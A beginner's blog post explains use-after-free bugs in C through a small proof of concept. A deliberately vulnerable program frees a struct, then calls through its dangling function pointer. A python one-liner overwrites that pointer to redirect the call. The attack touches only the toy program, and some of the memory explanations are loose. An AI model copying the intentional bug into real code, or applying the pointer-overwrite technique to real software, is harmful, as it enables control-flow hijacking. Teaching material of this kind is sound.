---
layout: 'blog.njk'
title: A Little About Use-After-Free Bug
description: Understanding how Use-After-Free bug could cause a vulnerability by looking at a small Proof-of-Concept in C
tags: blog
date: 2026-10-27
---

# A Little About Use-After-Free Bug

Quite often, *Use-After-Free* term appear in CVE report. I kept wondering what does that mean and how it could become a
vulnerability. Since I wasn't familiar with C or manual memory management. I looked into it and understand how it
could happen in C.

*Use-After-Free* or UAF is a bug specifically occurs on manual memory management programming language, like C and C++.
Why this is specific because plainly speaking, it happens when we allocate a memory address, use it to add value, then
label it as 'free' but forgot to empty the memory before reusing it. If this sounds confusing, let's start from the basic
on understanding how memory plays role in executing any program.

## Memory Basic

A program needs memory to store data, like assigning a value to be read by other function. In memory, there are two kind of
area: Heap and Stack. When we call a function, Stack is storing the instruction to be executed while Heap is storing the data
independently of the function. A more detailed explanation on this can be read [here](https://www.geeksforgeeks.org/dsa/stack-vs-heap-memory-allocation/).

Let's focus on Heap since we will focus on what is needed to understand UAF bug. See the following picture

<figure>
  <img src="/images/a-little-about-use-after-free-bug/heap-diagram.png" 
       alt="Two squares which show a name with 16 bytes and function with 8 bytes"
  >
  <figcaption>Figure 1. Heap Diagram. </figcaption>
</figure>

The diagram above shows two squares with label "Name" which has size 16 bytes and "Function" which has 8 bytes. Think of
memory is like a large land, we have no plan what to do with the land yet. Hence we start planning by reserving some space of
the land to be used for specific purpose. Let's say we have a ten square kilometers land area and we want to reserve 16 square
meters and 8 square meters for specific purpose. This is similar to how memory management works. We have 16 GB memory and we
are reserving or allocating 16 bytes and 8 bytes for data labeled as "Name" and "Function". Since these datas are stored in the
Heap, this is called heap allocation. When reserving a memory space, we need to know where it is located, hence a heap contains 
not just values but also addresses. Just like when we reserve part of a land we need the address to make it easier to locate
it.

Let's take example on how this looks like in C,

```c
//...
struct User {
    char name[16]; // storing a string
    void (*print_name)(char *); // storing function pointer
};

int main() {
    struct User *user = malloc(sizeof(struct User)); // Reserve memory for struct User

    //...
}
```

The snippet above implements diagram from Figure 1. The function here is `print_name` where we will store the pointer or the
address of the function in the heap. The `malloc` function is used to reserve memory for `User` struct which contain
data for `name` and `print_name`. This step is necessary since we are using manual memory management programming language.

### Memory Address

A value that is stored in a memory has an address. Which is called memory address. The address here is unlike a normal resident
address but a hexadecimal value which already explained [here](https://www.geeksforgeeks.org/dsa/stack-vs-heap-memory-allocation/).
We need to know about this because Use-After-Free bug will make more sense when we release a memory but forget to clean the
address. We will show more example later to better understand memory cleanup.

## Producing A Bug

So we already get a part of the basic about memory. Let's start producing a bug so it is easier to understand how releasing
memory works and why certain step is necessary.

We are building a minimal safe POC where we are going to exploit Use-After-Free bug by calling a different function to
print text. Let's do the first part,

```c
void print_normal(char *name) {
    printf("Hello, %s\n", name);
}

void print_hacked(char *name) {
    printf("SYSTEM COMPROMISED: %s\n", name);
}
```

We have 2 functions that we are going to use, the first one is what we use in the code, the second one will not be used in
the code. Instead, we are going to get the second function address and shows how to call the function using Use-After-Free bug.

Let's continue the next part,

```c
int main() {
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "Alice"); // Assign the value for 'name'
    user->print_name = print_normal; // Store print_name function address

    printf("Function address: %p\n", print_normal); // Print memory address of print_normal function
    free(user); // BUG: We only release the memory but the memory map address remains.

    user->print_name(user->name); // User-After-Free
    return 0;
}
```

This part is to showcase the bug but not the exploit yet. We are assigning the name as "Alice" and use `print_normal` as a
function to print text. Keep in mind that when we store a function here, we are actually storing the memory address of the
function. Notice on the `free` function there, this function tells us that we are releasing memory reserved by `user` so
it will have no value. However, remember that in a memory there are value and address. `free` function only release the memory
which we have no value but the address remains. See the output when we compile it,

```
> gcc useafterfree.c 
> ./a.out 
Function address: 0x401176
Hello, ��
```

Since we released the memory first before printing it, the name "Alice" is no longer stored but we can still call `print_name`
which store memory address for `print_normal` function. This shows the memory address is not removed during
releasing memory using `free` function. See the diagram below

<figure>
  <img src="/images/a-little-about-use-after-free-bug/heap-diagram-free.png" 
       alt="Two squares which show a name with 16 bytes and function with 8 bytes. The first square has grey scribble to indicate it is empty while the second square has text 0x401176 to indicate the function memory address"
  >
  <figcaption>Figure 2. Heap Diagram After Releasing Memory. </figcaption>
</figure>

As someone who is not familiar with manual memory management, I found this seems ok and not critical enough. However, let's
try to exploit this bug. We introduce another struct to reserve another memory space.

## Exploit POC

```c
struct User *attacker_payload = malloc(sizeof(struct User));
// REAL WORLD: Read 24 raw bytes directly from the user's input (stdin)
read(0, attacker_payload, 24);

```

What happens here, we are building another struct `attacker_payload` which reserves a memory, this is identical like `user` struct before. After
that, we are going to retrieve an input which the result would be stored into the new struct. The expectation here,
`user` struct and `attacker_payload` struct are using different memory space. The whole code becomes like this,

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct User {
    char name[16];
    void (*print_name)(char *);
};

void print_normal(char *name) {
    printf("Hello, %s\n", name);
}

void print_hacked(char *name) {
    printf("SYSTEM COMPROMISED: %s\n", name);
}

int main() {
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "Alice");
    user->print_name = print_normal;

    printf("Function address: %p\n", print_normal); 
    printf("Target address: %p\n", print_hacked); // Print address for print_hacked function
    free(user); // BUG: We didn't set user = NULL; the memory map address remains.
    // The attacker allocates a new object of the exact same size
    struct User *attacker_payload = malloc(sizeof(struct User));
    // REAL WORLD: Read 24 raw bytes directly from the user's input (stdin)
    read(0, attacker_payload, 24);

    user->print_name(user->name); // User-After-Free, we are using `user` struct instead of `attacker_payload`
    return 0;
}
```

We are printing the memory address for `print_hacked` function here since we are going to show how we can call the function
without explicitly update the code.

```c
temp> gcc useafterfree.c 
temp> ./a.out 
Function address: 0x401176
Target address: 0x4011ab
a
Hello, a
```

Ok, our first test here, we already get the address for our target, the `print_hacked` function. This address is randomly
generated so each PC and each compiles may have different memory address. What we are going to do here is, if we want to
call `print_hacked` we need to know the memory size required by the struct. From Figure 1, it was clear that the first
16 bytes are 'name' so we input 16 characters. However, the next 8 bytes is a memory address. So what we need to do to
execute a function here is, our first input will be 16 characters, then the next 8 bytes will be our target address.

Since our target address is 0x4011ab, we can use a python script to convert it to buffer since in terminal, all inputs are
converted into ASCII so it becomes a string instead of a buffer. Here is the script

```sh
python3 -c "import sys; sys.stdout.buffer.write(b'A'*16 + b'\xab\x11\x40\x00\x00\x00\x00\x00')" | ./a.out
```

Notice we revert the order from `0x4011ab` to `\xab\x11\x40\x00\x00\x00\x00\x00` because we are filling the last 8 bytes
and my AMD CPU [is](https://www.cs.ucr.edu/~csong/cs153/refs/amd64-vol4-media.pdf) little endian. Let's test this,

```
temp> python3 -c "import sys; sys.stdout.buffer.write(b'A'*16 + b'\xab\x11\x40\x00\x00\x00\x00\x00')" | ./a.out
Function address: 0x401186
Target address: 0x4011ab
SYSTEM COMPROMISED: AAAAAAAAAAAAAAAA�@
```

Notice what has gone wrong? We didn't change any code at all, we only alter the input. Yet the result is totally different,
instead of calling `print_normal` function, it is now printing using `print_hacked`. If we look back at the code again,
although we introduce a new struct `attacker_payload`, we are not using the struct other than just storing the value.

```
    //...
    user->print_name = print_normal;

    printf("Function address: %p\n", print_normal); 
    printf("Target address: %p\n", print_hacked); // Print address for print_hacked function

    free(user); // BUG: We didn't set user = NULL; the memory map address remains.
    // The attacker allocates a new object of the exact same size
    struct User *attacker_payload = malloc(sizeof(struct User));
    // REAL WORLD: Read 24 raw bytes directly from the user's input (stdin)
    read(0, attacker_payload, 24);

    user->print_name(user->name); // User-After-Free, we are using `user` struct instead of `attacker_payload`
    return 0;
}
```

See? We even use `user->print_name(user->name);` which already assigned with `print_normal` before. Even the `name` for `user`
struct here should be empty or printing some random character since we already called `free(user)`. This shows that we can
actually alter the code flow without changing the codebase but just through an input.
